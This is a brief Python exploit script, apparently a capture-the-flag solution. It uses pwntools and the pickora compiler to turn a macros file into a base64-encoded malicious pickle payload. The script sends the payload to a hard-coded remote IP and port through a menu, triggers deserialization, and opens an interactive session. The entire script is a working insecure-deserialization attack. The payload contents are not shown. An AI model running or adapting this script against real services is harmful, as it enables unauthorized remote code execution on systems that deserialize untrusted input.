from pwn import *
from pickora import Compiler
from base64 import b64encode

MACROS = open("./macros.py", "r").read()
print(MACROS)
def gen_payload(payload):
    return b64encode(compiler.compile(payload))

def exploit(macros):
    io = remote("94.237.62.195", 57937)
    payload = gen_payload(macros)
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", payload)
    io.sendlineafter(b"> ", b"1")
    io.interactive()

if __name__ == "__main__":
    compiler = Compiler()
    exploit(MACROS)
